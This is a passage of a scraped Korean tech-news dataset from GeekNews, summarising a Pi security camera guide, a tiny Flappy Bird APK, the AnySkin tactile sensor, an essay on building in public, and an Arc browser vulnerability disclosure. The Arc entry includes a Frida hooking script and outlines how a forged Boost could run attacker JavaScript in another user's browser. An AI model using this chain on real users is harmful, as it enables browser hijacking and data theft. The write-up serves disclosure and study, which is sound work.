     * 하지만 그들은 화살을 좋아할까?
"
"https://news.hada.io/topic?id=16807","라즈베리 파이 기반 오픈 소스 보안 카메라","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        라즈베리 파이 기반 오픈 소스 보안 카메라

     * Raspberry Pi를 저지연 홈 보안 카메라로 변환하는 프로젝트
          + v4l2DMA 하드웨어 인코더와 WebRTC를 사용
          + 미디어 서버 없이 순수 P2P 기반 카메라로 비디오 재생 및 다운로드 가능
          + 여러 사용자가 동시에 라이브 스트림 시청 가능
          + Raspberry Pi 5 또는 다른 SBC는 v4l2 하드웨어 인코딩을 지원하지 않음, 소프트웨어 인코딩 모드에서 실행 필요

  사용 방법

     * 최신 바이너리 파일을 Releases에서 다운로드
     * Pi Camera 앱 설치 및 지침 따르기

  하드웨어 요구 사항

     * Raspberry Pi (Zero 2W 이상)
     * CSI 카메라 모듈
     * 최소 4GB의 micro SD 카드
     * USB 디스크 및 Micro-USB Male to USB-A Female 어댑터

  환경 설정

    1. Raspberry Pi Imager를 사용하여 Lite OS (Bookworm 64-bit)를 micro SD 카드에 쓰기
    2. 필수 라이브러리 설치
sudo apt install libmosquitto1 pulseaudio libavformat59 libswscale6

    3. /boot/firmware/config.txt에 아래 내용 추가하여 Raspberry Pi 하드웨어 활성화
camera_auto_detect=0
start_x=1
gpu_mem=16

       camera_auto_detect=0 설정하여 v4l2로 카메라 읽기
    4. USB 디스크 마운트 [참조]
          + 비디오 녹화를 원하지 않으면 이 단계를 건너뛰고 실행 시 record_path 플래그 설정하지 않기
          + 디스크 드라이브가 감지되면 자동으로 /mnt/ext_disk에 마운트됨
sudo apt-get install autofs
echo '/- /etc/auto.usb --timeout=5' | sudo tee -a /etc/auto.master > /dev/null
echo '/mnt/ext_disk -fstype=auto,nofail,nodev,nosuid,noatime,umask=000 :/dev/sda1' | sudo tee -a /etc/auto.usb > /dev/null
sudo systemctl restart autofs

  애플리케이션 실행

     * 현재 MQTT가 유일한 신호 메커니즘으로 사용되므로, 애플리케이션 시작 전에 MQTT 서버 준비 필요
     * 애플리케이션이 LAN 내에서만 사용될 경우, 같은 Pi에 Mosquitto와 같은 MQTT 서버 설치 가능
     * 원격 액세스가 필요한 경우, 클라우드 기반 MQTT 서버 사용 권장 (예: HiveMQ, EXMQ)
     * 원격 신호 서버에 모바일 데이터로 접근하려면 DDNS 및 포트 포워딩 설정 필요

    실행

     * pi_webrtc 바이너리 파일을 -h 플래그와 함께 실행하여 모든 옵션 확인 가능
     * 설정을 적용하여 애플리케이션 시작
pulseaudio --start
/path/to/pi_webrtc --device=/dev/video0 --fps=30 --width=1280 --height=960 --v4l2_format=h264 --hw_accel --mqtt_host=example.s1.eu.hivemq.cloud --mqtt_port=8883 --mqtt_username=hakunamatata --mqtt_password=Wonderful --uid=home-pi-zero2w --record_path=/mnt/ext_disk/video/

       힌트 1: Pi 5는 하드웨어 인코딩을 지원하지 않으므로 --hw_accel 플래그 제거하고 --v4l2_format을 mjpeg로 설정. 비디오 인코딩은 OpenH264로 처리됨 힌트 2: 1920x1080 설정 시 하드웨어 디코더 펌웨어가 1920x1088로 변경되지만, isp/인코더가 조정되지 않아 메모리 범위를 벗어남. 1920x1088로 설정하면 문제 없음

    Linux 서비스로 실행

      1. pulseaudio를 시스템 전역 데몬으로 실행 [참조]

     * /etc/systemd/system/pulseaudio.service 파일 생성
[Unit]
Description= Pulseaudio Daemon
After=rtkit-daemon.service systemd-udevd.service dbus.service

[Service]
Type=simple
ExecStart=/usr/bin/pulseaudio --system --disallow-exit --disallow-module-loading
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

     * 클라이언트 설정에 autospawn = no 추가
echo 'autospawn = no' | sudo tee -a /etc/pulse/client.conf > /dev/null

     * root를 pulse 그룹에 추가
sudo adduser root pulse-access

     * 서비스 활성화 및 시작
sudo systemctl daemon-reload
sudo systemctl enable pulseaudio.service
sudo systemctl start pulseaudio.service

      2. pi_webrtc 실행 및 재부팅 시 자동 시작 설정

     * /etc/systemd/system/pi-webrtc.service 파일 생성
[Unit]
Description= The p2p camera via webrtc.
After=systemd-networkd.service

[Service]
Type=simple
WorkingDirectory=/path/to
ExecStart=/path/to/pi_webrtc --device=/dev/video0 --fps=30 --width=1280 --height=960 --v4l2_format=h264 --hw_accel --mqtt_host=example.s1.eu.hivemq.cloud --mqtt_port=8883 --mqtt_username=hakunamatata --mqtt_password=wonderful --record_path=/mnt/ext_disk/video/
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

     * 서비스 활성화 및 시작
sudo systemctl daemon-reload
sudo systemctl enable pi-webrtc.service
sudo systemctl start pi-webrtc.service

  고급 설정

     * 양방향 통신을 위해 마이크와 스피커 추가 필요

    마이크

     * 마이크 배선 및 테스트에 대한 지침은 링크 참조

    스피커

     * 스피커 설정에 대한 지침은 링크 참조

  라이선스

     * 이 프로젝트는 Apache License, Version 2.0에 따라 라이선스 부여됨. 자세한 내용은 LICENSE 파일 참조

GN⁺의 정리

     * 이 프로젝트는 Raspberry Pi를 저지연 홈 보안 카메라로 변환하는 방법을 제공함
     * v4l2DMA 하드웨어 인코더와 WebRTC를 사용하여 미디어 서버 없이 순수 P2P 기반으로 동작함
     * 여러 사용자가 동시에 라이브 스트림을 시청할 수 있어 가정용 보안 카메라로 유용함
     * MQTT를 사용한 신호 메커니즘으로 LAN 및 원격 액세스 모두 지원 가능
     * 유사한 기능을 가진 다른 프로젝트로는 MotionEye 및 ZoneMinder가 있음

        Hacker News 의견

     * 한 사용자는 집 수리 중 원격 감시를 위해 보안 시스템을 설치하려 했으나, 대부분의 기능이 광대역 인터넷을 필요로 한다는 사실을 알게 되었음
          + 대신 Raspberry Pi 카메라와 RPi Zero 2W, LTE 핫스팟, T-Mobile의 $5/월 선불 SIM을 사용하여 자체 시스템을 구축했음
          + 소프트웨어로는 imgcomp를 사용하여 매초 사진을 찍고, 변경된 사진을 VPS에 업로드하여 Gotify를 통해 휴대폰으로 알림을 받았음
     * 다른 사용자는 집을 짓는 동안 아파트에 살면서 타임랩스 비디오를 만들고 인터넷을 통해 작업 상황을 확인하려 했음
          + AliExpress에서 더 나은 품질의 카메라를 찾았음
     * 또 다른 사용자는 Raspberry Pi Zero WH를 사용하여 mediamtx 프로젝트를 고려했음
          + WebRTC를 활용한 좋은 예시로, DDNS와 포트 포워딩 설정이 필요할 수 있음
          + 오픈 소스 솔루션을 사용하여 Pi와 서버 간의 비공개 연결을 만들 수 있음
     * 한 사용자는 Raspberry Pi 5가 v4l2 하드웨어 인코딩을 지원하지 않는 점에 의문을 가졌음
     * 다른 사용자는 yolov3-tiny 모델을 사용하여 실시간 사람 감지를 시도하고 있었음
          + C++로 성능을 최대화하려고 노력 중임
     * 또 다른 사용자는 Sentry-Picam을 사용하여 유사한 목적을 달성했으며, Syncthing을 통해 3대의 다른 기기와 동기화하고 sendxmpp를 기반으로 푸시 알림 스크립트를 연결했음
     * 한 사용자는 Nvidia Jetson을 사용하여 유사한 프로젝트를 진행했으며, 현재 reCamera에 관심을 가지고 있음
     * 또 다른 사용자는 오픈 소스 펌웨어를 사용하는 보드를 찾고 있었음
     * 마지막으로, 한 사용자는 소리만 녹음하려면 WebRTC가 좋은 솔루션인지 궁금해했음
"
"https://news.hada.io/topic?id=16889","안드로이드용 Flappy Bird, C 언어로 작성, 100KB 이하","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 안드로이드용 Flappy Bird, C 언어로 작성, 100KB 이하

     * Flappy Bird, only C, without Java/Kotlin, weight APK (armeabi-v7a +arm64-v8a) < 100 kilobytes

역사:

     * 2021년에 rawdrawandroid 저장소를 발견함
     * 가능한 한 작은 APK 크기의 간단한 게임을 만들고자 하는 동기가 생김
     * Flappy Bird 게임의 클론을 만들기로 결정함
     * 첫 시도는 C++와 ImGui를 사용하여 진행했으나 실패함
          + APK 크기가 약 1 메가바이트였음
          + 게임 충돌 가능성이 있었음
          + APK에 armeabi-v7a 라이브러리만 포함되어 있었음
          + 프로젝트 구조가 복잡하고 정리가 안 되어 있었음

동기:

     * 2024년 9월 14일 Raylib 디스코드 채널에서 C#으로 Flappy Bird를 만든 사람을 봄
     * C 언어로 Android용 APK 크기를 100킬로바이트 이하로 만드는 아이디어에 도전하고 싶어짐
     * 오늘날 APK 크기가 500메가바이트에 달하는 상황에서 100킬로바이트 이하로 유지하는 것은 매우 어려운 일임
     * 결국 성공했지만 쉽지 않았음

구현:

     * 처음에는 C로 Hello World를 컴파일하고, 라이브러리를 APK로 패키징하여 USB를 통해 장치로 전송함
     * 게임의 리소스를 탐색하기 시작함
     * 처음에는 ogg 형식의 소리를 사용했으나 문제 발생, 이후 mp3 형식으로 변경하여 압축함
     * BASS를 사용하여 소리를 재생하려 했으나 무거워서 OpenSLES를 공부하여 MP3 형식을 문제없이 읽도록 함
     * png 이미지를 사용하고, stb_image보다 가벼운 upng를 찾아 디코딩 문제를 해결함
     * OpenGL ES 2 + 셰이더로 렌더링, OpenSLES로 소리 재생, upng로 png 디코딩, Android Native Activity 사용

빌드:

     * Visual Studio 2022 다운로드
          + Visual Studio Installer 열기
          + ""Edit"" 클릭
          + C++ 클래식 애플리케이션 개발, C++ 모바일 애플리케이션 개발 항목 선택
     * Android Studio 다운로드 (apktool, sdk, ndk 필요)
          + NDK 25.2.9519653 설치 (상위 버전 사용 가능)
     * 프로젝트 설정은 ""Debug ARM""으로 되어 있으나 build.bat에서 경로 수정 필요
     * CTRL + B로 컴파일

저작권:

     * 저작권 주장하지 않음. 게임과 리소스의 권리는 DotGEARS에 있음

영감:

     * rawdrawandroid
     * Flapper
     * Raylib
     * ImGui

GN⁺의 정리:

     * 이 프로젝트는 C 언어로 Android용 Flappy Bird 게임을 만들고자 하는 도전적인 시도임
     * APK 크기를 100킬로바이트 이하로 유지하면서도 게임을 구현하는 데 성공함
     * OpenGL ES 2, OpenSLES, upng와 같은 다양한 기술을 사용하여 리소스를 최적화함
     * 이 프로젝트는 소프트웨어 엔지니어에게 작은 크기의 효율적인 게임 개발에 대한 통찰을 제공함
     * 비슷한 기능을 가진 프로젝트로는 Raylib과 rawdrawandroid가 있음

        Hacker News 의견

     * 앱 스토어에 ""10MB 이하 앱"" 필터가 있었으면 좋겠음
          + 작은 앱들이 더 빠르고 광고나 마이크로 결제가 적음
          + 3MB의 온도계 앱이 150MB의 온도계 앱보다 더 만족스러움
     * Flappy Bird를 왜 사람들이 플레이하는지에 대한 문헌 리뷰를 작성한 경험 공유
          + 게임 연구 대학원생 시절의 일임
          + 논문 링크: http://www.fdg2015.org/papers/fdg2015_paper_60.pdf
     * Nim으로 비슷한 프로젝트를 2020년에 출판한 경험 공유
          + Dalvik 바이트코드와 .apk 파일을 위한 어셈블러 작성
          + 코드가 오래되어 다시 살려보고 싶음
          + 유튜브 링크: https://youtube.com/watch/…
     * 코드가 4k loc 이하임
457 android_native_app_glue.c
360 audio.c
802 game.c
201 init.c
93 main.c
39 mouse.c
38 shaders.c
229 texture.c
1377 upng.c
27 utils.c
3623 total

     * Super Mario Bros는 40KB였음
          + 링크: https://news.ycombinator.com/item?id=21213421
     * 안드로이드 APK를 만들기 위해 자바 글루잉이 필요하다고 생각했음
          + 이 프로젝트에서 자바 파일이 없어서 놀라움
          + rawandroid 프로젝트도 참고할 가치가 있음
          + 링크: https://github.com/cnlohr/rawdrawandroid/tree/master
     * 1MB 이하의 안드로이드 앱을 보는 것이 정말 멋짐
          + 오래된 HTC에서도 실행 가능함
          + 축하함
     * ""Floppy Bird""라고 이름 지었으면 좋았을 것 같음
          + 3.5인치 플로피 디스크에 들어갈 수 있음
     * 기존의 부풀려진 서드파티 컴포넌트 대신 ""정성스럽게 제작된"" 프로그램/게임/앱을 보는 것이 상쾌하고 좋음
     * rawdrawandroid를 사용하여 C 애플리케이션을 안드로이드에서 작성하는 기술이 raylib (및 다른 C 프레임워크)도 사용할 수 있는지 궁금함
          + Termux를 통해 안드로이드에서 안드로이드용 C 개발 환경을 사용할 수 있는지 궁금함
"
"https://news.hada.io/topic?id=16858","웹사이트 방문 없이 누구의 브라우저에도 접근 가능한 기술","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    웹사이트 방문 없이 누구의 브라우저에도 접근 가능한 기술

Arc의 클라우드 기능 소개

     * Arc를 사용하려면 계정이 필요함
     * Firebase를 인증에 사용함
     * 'Easels'라는 화이트보드 같은 기능이 있음
     * 공유 버튼을 클릭해도 mitmproxy에 요청이 나타나지 않음

Objective-C 기반 Firebase 앱 해킹

     * Firestore를 사용하여 백엔드를 작성하지 않고 데이터베이스 보안 규칙만 작성함
     * Firestore는 Swift SDK에서 시스템 프록시 설정을 따르지 않음
     * Frida 스크립트를 작성하여 관련 호출을 덤프함

var documentWithPath = ObjC.classes.FIRCollectionReference[""- documentWithPath:""];
var queryWhereFieldIsEqualTo = ObjC.classes.FIRQuery[""- queryWhereField:isEqualTo:""];
var collectionWithPath = ObjC.classes.FIRFirestore[""- collectionWithPath:""];

function getFullPath(obj) {
  if (obj.path && typeof obj.path === ""function"") {
    return obj.path().toString();
  }
  return obj.toString();
}

var queryStack = [];

function logQuery(query) {
  var queryString = `firebase.${query.type}(""${query.path}"")`;
  query.whereClauses.forEach((clause) => {
    queryString += `.where(""${clause.fieldName}"", ""=="", ""${clause.value}"")`;
  });
  console.log(queryString);
}

Interceptor.attach(documentWithPath.implementation, {
  onEnter: function (args) {
    var parent = ObjC.Object(args[0]);
    var docPath = ObjC.Object(args[2]).toString();
    var fullPath = getFullPath(parent) + ""/"" + docPath;
    var query = { type: ""doc"", path: fullPath, whereClauses: [] };
    queryStack.push(query);
    logQuery(query);
  },
});

Interceptor.attach(collectionWithPath.implementation, {
  onEnter: function (args) {
    var collectionPath = ObjC.Object(args[2]).toString();
    var query = { type: ""collection"", path: collectionPath, whereClauses: [] };
    queryStack.push(query);
  },
});

Interceptor.attach(queryWhereFieldIsEqualTo.implementation, {
  onEnter: function (args) {
    var fieldName = ObjC.Object(args[2]).toString();
    var value = ObjC.Object(args[3]).toString();

    if (queryStack.length > 0) {
      var currentQuery = queryStack[queryStack.length - 1];
      currentQuery.whereClauses.push({ fieldName: fieldName, value: value });
    }
  },
  onLeave: function (retval) {},
});

var executionMethods = [
  ""- getDocuments"",
  ""- addSnapshotListener:"",
  ""- getDocument"",
  ""- addDocumentSnapshotListener:"",
  ""- getDocumentsWithCompletion:"",
  ""- getDocumentWithCompletion:"",
];

executionMethods.forEach(function (methodName) {
  if (ObjC.classes.FIRQuery[methodName]) {
    Interceptor.attach(ObjC.classes.FIRQuery[methodName].implementation, {
      onEnter: function (args) {
        if (queryStack.length > 0) {
          var query = queryStack.pop();
          logQuery(query);
        }
      },
    });
  }
});

function formatFirestoreData(data) {
  if (data.isKindOfClass_(ObjC.classes.NSDictionary)) {
    let result = {};
    data.enumerateKeysAndObjectsUsingBlock_(
      ObjC.implement(function (key, value) {
        result[key.toString()] = value.toString();
      })
    );
    return JSON.stringify(result);
  }
  return data.toString();
}

var documentMethods = [
  { name: ""- updateData:completion:"", type: ""update"" },
  { name: ""- updateData:"", type: ""update"" },
  { name: ""- setData:completion:"", type: ""set"" },
  { name: ""- setData:"", type: ""set"" },
];

documentMethods.forEach(function (method) {
  if (ObjC.classes.FIRDocumentReference[method.name]) {
    Interceptor.attach(
      ObjC.classes.FIRDocumentReference[method.name].implementation,
      {
        onEnter: function (args) {
          var docRef = ObjC.Object(args[0]);
          var data = ObjC.Object(args[2]);
          var fullPath = getFullPath(docRef);
          var formattedData = formatFirestoreData(data);
          console.log(
            `firebase.doc(""${fullPath}"").${method.type}(${formattedData})`
          );
        },
      }
    );
  } else {
    console.log(""Warning: "" + method.name + "" not found"");
  }
});

     * Arc가 Firestore에 사용자 기본 설정, 사용자 객체, 추천 및 부스트를 저장함

Arc 부스트란 무엇인가

     * Arc 부스트는 사용자가 웹사이트를 커스터마이징할 수 있는 방법임
     * 요소 차단, 글꼴 변경, 색상 변경, 사용자 정의 CSS 및 JS 사용 가능
     * 부스트를 생성하고 다른 사용자 ID로 업데이트할 수 있음

다른 사용자의 ID 얻기

     * 사용자 추천: 추천 테이블에서 사용자 ID를 얻을 수 있음
     * 공개 부스트: 부스트 스냅샷에 생성자의 사용자 ID가 포함됨
     * 사용자 이젤: 이젤을 공유하여 사용자 ID를 얻을 수 있음

최종 공격 체인

     * 피해자의 사용자 ID를 얻음
     * 악성 부스트를 생성하고 자신의 계정에 저장함
     * 부스트의 creatorID 필드를 타겟의 ID로 업데이트함
     * 피해자가 타겟 웹사이트를 방문하면 감염됨

특권 페이지에서의 RCE

     * 부스트가 다른 프로토콜에서도 실행됨
     * chrome://settings 페이지에서 특권 상승 가능

개인정보 보호 문제

     * 방문하는 사이트에 대한 데이터가 서버로 전송됨
     * Arc의 개인정보 보호 정책에 위배됨

GN⁺의 정리

     * Arc의 클라우드 기능과 보안 취약점을 분석한 기사임
     * Firestore를 활용한 백엔드 보안 문제를 다룸
     * Arc 부스트를 통한 사용자 커스터마이징과 보안 취약점 설명
     * 다른 사용자의 ID를 얻어 악성 부스트를 실행하는 방법을 제시함
     * 개인정보 보호 문제와 특권 상승 가능성에 대한 우려를 제기함

        Hacker News 의견

     * Arc 브라우저의 보안 취약점은 용서할 수 없는 수준이며, 이로 인해 Arc를 다시는 사용하지 않을 것임
     * 클릭할 때마다 달려오는 픽셀 아트 고양이가 재미있고 인터넷이 즐거운 공간이 될 수 있음을 상기시켜줌
     * Arc 브라우저를 사용하는 사람들에게 경고하기 위해 게시물 제목에 Arc를 추가할 필요가 있음
     * Arc는 계정을 요구하고 사용자가 방문하는 모든 페이지의 호스트 이름과 사용자 ID를 Google의 Firebase에 전송함. 이는 Arc가 현재 사용 중인 가장 사생활 보호가 안 되는 웹 브라우저임을 의미함
     * Firebase 보안 규칙의 기본 설정이 이상하며, 경험이 있는 개발자는 클라이언트가 자신의 사용자 ID를 보호된 API 경로로 전달하도록 하지 않음
     * OP는 Arc 브라우저에 대해 이야기하고 있으며, Arc 언어나 다른 프로젝트와 혼동하지 말아야 함
     * Arc 브라우저는 오래가지 않을 것 같으며, Chrome이 가장 안전한 브라우저임. 새로운 소프트웨어 선택에 신중해야 함
     * $2000의 보상금은 큰 취약점에 비해 모욕적인 금액임
     * 블로그 게시물에서 언급된 'arc'가 무엇인지 궁금해하는 사람 있음. Arc 브라우저로 보임
     * 대문자가 제대로 사용되지 않아 읽기 어려운 기사임
"
"https://news.hada.io/topic?id=16868","AnySkin : 로봇에 터치 센서를 장착하여 초정밀 작업 학습하기","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 AnySkin : 로봇에 터치 센서를 장착하여 초정밀 작업 학습하기

AnySkin: 플러그 앤 플레이 로봇 터치 감지

     * 요약
          + 촉각 감지는 중요한 감지 방식으로 인정받고 있지만, 시각 및 고유 수용 감각에 비해 사용 빈도가 낮음
          + AnySkin은 다용성, 교체 가능성, 데이터 재사용성 문제를 해결하여 효과적인 솔루션 개발을 방해하는 주요 과제를 해결함
          + ReSkin의 단순한 디자인을 기반으로 감지 전자 장치를 감지 인터페이스에서 분리하여 통합을 간소화함
          + AnySkin은 학습된 조작 정책의 인스턴스 간 일반화를 제공하는 최초의 센서임
     * 주요 기여
          + 접착제 없이 내구성이 뛰어나고 쉽게 교체 가능한 자기 촉각 센서를 제작하는 간소화된 제작 공정 및 설계 도구 소개
          + AnySkin 센서를 사용한 미끄럼 감지 및 정책 학습 특성화
          + AnySkin의 한 인스턴스에서 학습된 모델이 새로운 인스턴스에 일반화되는 것을 시연하고, DIGIT 및 ReSkin과 같은 기존 촉각 솔루션과 비교
     * AnySkin의 특징
          + 로봇 터치를 위해 제작된 피부 센서로 조립이 쉽고 다양한 로봇 엔드 이펙터와 호환 가능하며 새로운 피부 인스턴스로 일반화됨
          + 자화된 철 입자가 있는 감지 표면에서 생성된 자기장 왜곡을 통해 접촉을 감지함
          + 유연한 표면이 전자 장치와 물리적으로 분리되어 손상 시 쉽게 교체 가능

  정책 학습 및 피부 교체 가능성

     * 비디오 예시
          + 학습된 행동 복제 정책이 피부를 교체해도 세 가지 작업에서 성공적으로 유지됨
          + 카드 스와이핑
          + 플러그 삽입
          + USB 삽입

  인스턴스 간 일반화 결과

     * 미끄럼 감지
          + AnySkin은 잡은 물체의 미끄러짐을 감지할 수 있음
          + 30개의 일상 물체 데이터를 사용하여 훈련된 LSTM 모델이 92%의 정확도로 미끄럼 이벤트를 예측할 수 있음
     * 원시 신호 시각화
          + 감지 전자 장치는 세 축에서 자기 플럭스 밀도를 측정하는 다섯 개의 자기계를 포함함
          + 비디오에서 AnySkin 신호의 원시 시각화를 확인할 수 있음

  실험 결과

  제작 과정

     * 제작 방법
          + AnySkin은 Smooth-On DragonSkin 10 Slow와 MQFP-15-7(25μm) 자기 입자를 1:1:2 비율로 혼합하여 위에 표시된 두 부분 몰드에서 경화하여 만듦
          + 경화된 피부는 펄스 자화기를 사용하여 자화됨
          + 그리퍼 팁의 설계 파일은 오픈 소스로 제공됨

  GN⁺의 정리

     * AnySkin은 로봇 터치 감지에서 다용성, 교체 가능성, 데이터 재사용성을 해결하는 혁신적인 솔루션임
     * 학습된 정책이 피부 교체 후에도 유지되며, 인스턴스 간 일반화가 가능함
     * 미끄럼 감지와 같은 실용적인 응용 프로그램에서 높은 정확도를 보임
     * 유사한 기능을 가진 다른 제품으로는 DIGIT 및 ReSkin이 있음

        Hacker News 의견

     * 실리콘 고무에 자성 입자를 주입하고 자화한 후, 자력계를 사용해 자력장의 변화를 감지하여 고무의 변형을 감지하고 표면의 ""압력 지점""을 분석할 수 있음
          + 제조 과정에서 일관성이 유지되어 재교정이 필요 없는 교체 가능한 부품이 됨
          + 고급 터치 센서가 맞춤형 손으로 만든 못보다 기계로 자른 나사와 유사해짐
     * 이 기술이 매우 인상적임
          + 쓰레기와 재활용품을 분류하는 데 사용할 수 있을지 궁금함
          + 오염물이 묻거나 시간이 지나도 재교정이 가능한지 궁금함
          + 토마토를 씻고 줄기를 제거할 수 있을지 궁금함
          + 이 기술로 트랙패드를 만들고 싶음
          + 해상도가 얼마나 될지 궁금함
          + 해상도를 희생하지 않고 압력, 기울기 등을 제공할 수 있을지 궁금함
          + 피부를 만지는 느낌이 들면 얼마나 이상할지 궁금함
     * 3축 자력계 칩이 핵심임
          + 자화 단계에서 자성 입자가 평행하게 정렬됨
          + 가정용 작업장에서 사용할 수 있는 흥미로운 기술임
     * 전자 악기에 유용할 것 같음
          + Linnstrument와 같은 악기에 사용될 수 있음
          + 센서가 나란히 있을 때 서로 간섭하는지 궁금함
     * Takktile 센서보다 제조가 훨씬 쉬움
          + 강한 층을 칩과 피부 사이에 두면 회로 기판을 손상시키지 않고 높은 힘을 사용할 수 있음
          + 정책 학습 부분이 기술 독립적인지 궁금함
          + 모델이 접촉 위치보다 방향 벡터에 의존하는지 궁금함
     * USB 삽입 등의 작업에서 각도 변화나 압력 차이를 감지하는지 궁금함
          + 주요 피부 재료가 성형된 실리콘인지 TPU인지 궁금함
     * 자성 입자를 유연한 매체에 평행하게 배치하는 것이 진정한 돌파구임
          + Magnequench 회사가 다른 재료에 입자를 주입할 수 있는지 알고 있을 것 같음
          + 이러한 입자의 가장 일반적인 사용 사례가 무엇인지 궁금함
          + Dragon Skin을 꼭 사용해야 하는지 궁금함
          + 자성 입자를 반고체 매체에 혼합하는 아이디어가 흥미로움
          + 외부 자력을 적용하여 입자가 매체를 변형시킬 수 있는지 궁금함
     * ""제조 과정"" 그래픽이 매우 간단하고 좋음
     * 로봇 촉각 연구를 했었음
          + ""biotac"" 센서를 사용했는데 매우 비싸고 교체가 어려움
          + biotac의 장점은 구매할 수 있다는 것임
          + 학술적으로 개발된 대부분의 것들은 구매할 수 없음
          + 이 센서들이 멋져 보임
     * 포장이 좋음
          + 이런 센서는 수십 년 동안 존재했지만, 이번 포장이 좋음
          + 교체 가능한 커버가 큰 장점임
          + ""피부"" 타입 센서는 여러 번 만들어졌지만, 마모되는 부분에 센서가 포함되어 있어 생산에 적합하지 않았음
     * Google 계정이 있어야 주문할 수 있음
          + Meta가 자금을 지원했음
"
"https://news.hada.io/topic?id=16908",""Building in Public" 이 정말로 효과가 있을까?","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ""Building in Public"" 이 정말로 효과가 있을까?

     * ""Building in Public(공개적으로 구축하기)""는 투명하고 개방적으로 회사의 이야기를 공유하는 관행
          + 인디 해커들이 보통 자기 서비스의 매출을 공유하는 등의 블로그/트윗 등을 올림
     * 처음엔 ""다들 하고 있으니 좋은거 겠지?"" 라고 생각했지만, 얼마 지나고 나니 의문이 들기 시작

첫 번째 질문: 사람들이 과하게(overdoing) 하고 있는 걸까?

     * X에서 여러 인디 해커들을 팔로우하면, 이런 ""공개적으로 구축하기"" 트윗들을 보게 됨
     * 내 관찰에 따르면, 10개의 ""공개적으로 구축하기"" 게시물 중 아마도 5~6개는 ""어떻게 3개월 만에 매출을 100배 늘렸는지""와 같은 게시물과 섞여 있는 수익을 공유하고 있음
     * 오해하지 말아야 할 점은, 나는 이러한 게시물에 반대하지 않음. 1k 이정표를 넘었다면, 나도 전 세계와 공유하고 싶음
     * 하지만 문제는, 사람들이 제품에 대한 아이디어와 계획보다는 자신의 성과에 대해 더 기꺼이 게시하는 것처럼 보인다는 것임
     * 아마도 성취 게시물이 더 많은 관심을 끌기 때문일까? 모르겠음
     * 하지만 제품 때문에 누군가를 팔로우한다면, 그 사람보다는 제품 자체에 더 관심이 있음: 어떤 기능이 추가되고 있는지, 장기적인 계획은 무엇인지 등을 알고 싶어 함
     * 그냥 내 생각일 수도 있지만, 일부 게시물은 단순히 자랑하는 것처럼 느껴짐
     * 물론, 10k, 100k MMR을 달성했다면 축하함. 하지만 정말 매일 반복해서 그것에 대해 이야기할 필요가 있을까? 그것이 고객/팔로워에게 어떤 이익을 주는가, 어떤 가치를 가져다주는가? 전혀 없음. 그냥 클릭베이트일 뿐임
     * 한 번, 두 번은 영감을 주고 시야를 넓혀주지만, 더 많은 횟수는 그냥 지루해질 뿐임

두 번째 질문: 실제로 효과가 있는가?

     * 10년 전에는 ""공개적으로 구축하기""가 새로운 개념이었음
     * 당시에는 전통적인 빌드 -> 런치 방식이 주류였음
          + 갑자기 이전에 보지 못한 방식으로 모든 것을 공유하기 시작한 사람이 있었음 (levels.io 의 Pieter Levels)
          + 그가 무엇을 만들고 있는지, 무엇이 효과가 있고 무엇이 효과가 없는지, 얼마나 벌었는지 등을 공유
          + 이것은 자연스럽게 그에게 많은 관심을 가져다주었고 그를 유명하게 만들었음 (물론, 좋은 제품과 함께)
     * 예전에는 ""인디해킹""도 새로운 것이었고, 그것을 하는 사람은 거의 없었음
     * 요즘은 상황이 완전히 달라졌음
          + 트위터의 ""Build in Public"" 커뮤니티에는 33.3k명의 회원이 있음
          + r/indiehackers 에는 20k명의 회원이 있음
          + indiehackers.com 에는 100K명의 구독자가 있음
     * 인디해커 분야는 더 이상 한밤중의 황량한 광장이 아니라, 이제는 사람들로 가득 차 있음:
          + 대학을 중퇴한 젊은 학생들, 더 큰 꿈을 좇기 위해 9-5 직장을 그만둔 사람들, 해고당하고 다시는 그렇게 하지 않기로 결심한 사람들
     * Google 트렌드에 따르면, 2016년 10월 이전에는 ""indiehacker"" 또는 ""indie hacker""에 대한 검색이 거의 없었음. 하지만 요즘은 엄청 많음

모두가 공개적으로 구축할 때, 아무도 공개적으로 구축하지 않음

     * 인정합시다, 공개적으로 구축하는 주된 목적은 관심을 끌고 커뮤니티를 구축하여 지속적으로 제품을 판매할 수 있게 하는 것임
     * 하지만 모두가 그렇게 하고 있고 (일부는 예외적으로 잘하고 있음), 얼마나 많은 관심을 받을 수 있을까?
     * 이상하게 들릴 수 있지만, 궁극적으로 중요한 것은 여전히 제품이라는 것을 잊지 말아야 함
     * 많은 성공한 인디해커들과 솔로프레너들은 공개적으로 구축하지 않거나, 적어도 대중적인 방식으로 하지는 않음
     * 공개적으로 구축하지 않는 성공적인 인디해커들이 있음
          + Nick Moore (PopClip 개발자)는 거의 트윗하지 않고, 큰 업데이트가 있을 때만 사용자 포럼에 게시함
          + Danny Lin (OrbStack 개발자)은 수익을 공유한 적이 없고, 가끔씩만 트윗함
     * 그들은 지금까지 존재했던 최고의 소프트웨어 중 일부를 만들었고, 공개적으로 구축하지 않음
     * 제가 말하고 싶은 것은, 공개적으로 구축하는 것이 좋고 일부에게는 효과가 있을 수 있지만, 그것이 유일한 방법은 아니며, 인디해커로서 그렇게 하지 않는다고 해서 어떤 압박감을 느낄 필요가 없다는 것임

마무리

     * 필자는 아직 새로운 인디 해커로서 탐구 중임
     * 질문을 제기했지만, 답을 가지고 있지는 않음

GN⁺의 정리

     * ""공개적으로 빌드하기""는 투명성과 개방성을 통해 회사의 이야기를 공유하는 방식임
     * 많은 인디 해커들이 성과를 공유하지만, 제품의 아이디어와 계획에 대한 정보는 부족함
     * 너무 많은 사람들이 같은 방식으로 주목을 끌려고 하면, 주목받기 어려워짐
     * 중요한 것은 결국 제품 자체이며, 공개적으로 빌드하지 않아도 성공할 수 있음
     * 인디 해커들은 ""공개적으로 빌드하기""에 대한 압박을 느낄 필요가 없음

   Pieter Levels 는 가장 인상적인 1인 회사들 에서 얘기된 적이 있습니다.
   원격근무 잡마켓, AI사진, 노마드 커뮤니티 등의 사이트를 만들어서 ~$3M+(38억원) 매출을 내는 사람이고, ""Make - The Indie Maker Handbook"" 라는 책도 썼습니다.

        Hacker News 의견

     * ""Build in public"" 전략은 대부분 다른 indiehacker들을 위한 제품을 만드는 결과를 초래함
          + 주로 micro-SaaS 개발 도구나 성장 해킹 도구를 만들게 됨
